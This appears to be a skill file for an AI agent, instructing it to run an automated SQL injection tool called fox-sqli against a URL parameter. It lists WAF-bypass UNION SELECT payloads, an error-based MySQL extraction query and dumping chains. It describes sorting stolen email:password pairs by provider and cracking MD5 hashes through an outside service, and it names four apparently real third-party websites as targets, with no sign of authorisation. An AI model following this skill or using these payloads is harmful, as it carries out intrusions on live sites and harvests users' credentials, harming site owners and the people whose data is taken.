---
name: fox-sqli
description: This skill should be used when the user asks to "sql inject", "dump database", "sqli", "error based injection", "union select sqli", "enumerate tables", "extract data from sql", "WAF bypass sqli", "DIOS injection", "fox-sqli.py", or needs automated SQL injection with UNION SELECT variants, error-based GROUP BY extraction, DIOS techniques, WAF bypass, and data dumping. Use when the target URL has a parameter that appears SQL injectable (e.g., .php?id=, .aspx?id=, .php?page=).
version: 1.0.0
---

# fox-sqli — Elite SQL Injection Toolkit

Run from: `C:\Users\lhuciver\fox-tools\fox-sqli.py`
Execute with: `fox-sqli "http://target/page.php?id=1"`
Or: `python C:\Users\lhuciver\fox-tools\fox-sqli.py "http://target/page.php?id=1"`

## Quick Reference

### Basic Usage
```powershell
fox-sqli "http://target.com/page.php?id=1"
fox-sqli "http://target.com/page.php?id=1" --timeout=15
fox-sqli --help
```

## Workflow

### Step 1 — Run the tool
Pass the target URL with parameter to fox-sqli.py.

```powershell
fox-sqli "http://target.com/products.php?id=10"
```

The tool will:
- Auto-detect if URL is injectable (diff-based comparison with `'` and `'--+`)
- Determine string-based vs integer-based injection
- Detect WAF presence (behavioral + signature-based)

### Step 2 — Auto enum
If injectable, the tool automatically:
1. Gets DB version and user via error-based `GROUP BY + CONCAT + FLOOR(RAND(0)*2)` technique
2. Enumerates all databases via error-based extraction
3. Prompts to select target database
4. Enumerates all tables in selected database
5. Prompts to select target table
6. Enumerates all columns in selected table
7. Auto-identifies interesting columns (email, password, user, admin, etc.)
8. Dumps data with multi-fallback query chain

### Step 3 — Data processing
After dump, the tool:
- Auto-filters email:password patterns by provider (gmail, yahoo, hotmail, aol, others)
- Saves sorted results per provider
- Attempts MD5 hash cracking via md5decrypt.net API
- Saves everything to organized output directory

## Techniques Implemented

### UNION SELECT Variants (12 styles)
Tries each variant in sequence until one works:

| # | Technique | Example |
|---|-----------|---------|
| 1 | Standard UNION SELECT | `+UNION+SELECT+` |
| 2 | AND 0 bridge | `+AND+0+UNION+SELECT+` |
| 3 | AND mod(9,9) | `+AND+mod(9,9)+UNION+SELECT+` |
| 4 | Version comment | `/*!50000UniON*/+/*!50000sEleCt*/+` |
| 5 | AND0 + version comment | `+and+0+/*!50000UniON*/+/*!50000sEleCt*/+` |
| 6 | Comment separator | `/**8**/and/**8**/mod(9,9)/**8**//*!50000union*//**8**//*!50000select*//**8**/` |
| 7 | URL-encoded UNION | `/*!50000%55NIoN*/+/*!50000%53eLEct*/+` |
| 8 | Newline whitespace | `%0aand%0a0%0aUniON%0aselect%0A` |
| 9 | Long padding | `+and+mod(9,9)+/*!50000UniON*/%23` + 300xA + `%0A/*!50000sEleCt*/+` |
| 10 | Double-encoded | `+and+mod(9,9)%20unION%2523` + 200xa + `%0aSelect%20` |

### Error-Based Extraction
Uses MySQL duplicate entry error technique:
```sql
AND(SELECT 1 FROM(SELECT COUNT(*),CONCAT(({extract}),FLOOR(RAND(0)*2))x
FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a)--+
```
With WAF version using `/*!50000*/` comment hacks.

### DIOS (Dump In One Shot)
Four variants using `export_set()` and `@variable` concatenation to dump all tables+columns in a single query.

### WAF Bypass Techniques
| Technique | Payload |
|-----------|---------|
| Comment separator | `/**8**/` |
| Newline injection | `%23%0a`, `%250a` |
| Tab injection | `%09` |
| Long comment flood | `%23` + 200+ `A` chars + `%0a` |
| Double encoding | `%2523` + padding + `%0A` |
| Version comment | `/*!50000keyword*/` |
| Dash-newline | `--%20-%0A` |

### Dump Query Fallback Chain
Tries these in order until data is returned:
1. `Dump` — @variable CONCAT with GROUP_CONCAT
2. `Dump1` — GROUP_CONCAT with hex separators
3. `Dump2` — @variable with /!50000/ comment bypass
4. `Dump3` — GROUP_CONCAT with /!50000/ bypass
5. `Dump4` — @variable CONCAT with comment
6. `Dump9` — Custom bypass whitespace variant
7. `Dump99` — Custom bypass with @variable

## Target Sites for Reference
These from psqli-pro are good test targets:
- http://sekarlaut.com/products.php?ID=23&cID=1
- http://lexsite.com/latestArticle.php?id=5
- http://gandariacity.co.id/tenant.php?id=17
- https://www.prettypetalsstore.com/single.php?id=68

## Output Structure
Results save to `fox-sqli-output/{hostname}/`:
- `info.txt` — DB version and user
- `databases.txt` — enumerated databases
- `tables.txt` — enumerated tables
- `columns_{table}.txt` — columns per table
- `dump_{table}.txt` — raw dumped data
- `emails_gmail.txt`, `emails_yahoo.txt`, etc. — filtered by provider
- `cracked.txt` — cracked MD5 passwords

## When to Use Each Technique

| Scenario | Technique |
|----------|-----------|
| Target returns SQL errors | Error-based extraction (fastest) |
| Target hides errors, normal page | Error-based still works via duplicate entry |
| Error-based blocked/fails | UNION SELECT with column counting first |
| WAF detected | Tool auto-switches to `waf="on"` mode with `/*!50000*/` bypasses |
| Error-based WAF blocks | Long padding + comment flood variants |
| Simple site, no WAF | Standard UNION SELECT |
| Need all tables at once | DIOS techniques |
| Data contains emails | Auto-filtered by provider post-dump |
| MD5 hashes in dump | Auto-cracked via md5decrypt API |

## Manual Override
If auto-detection fails or you want to force injection:
- The tool asks "Force inject anyway? (y/n)" if vuln detection fails
- You can specify columns manually if enumeration fails
- You can enter database/table/column names directly instead of selecting from list

## References
- `references/psqli-techniques.md` — Full technique breakdown from psqli-pro
- Original: https://github.com/Agressiv1njector/psqli-pro
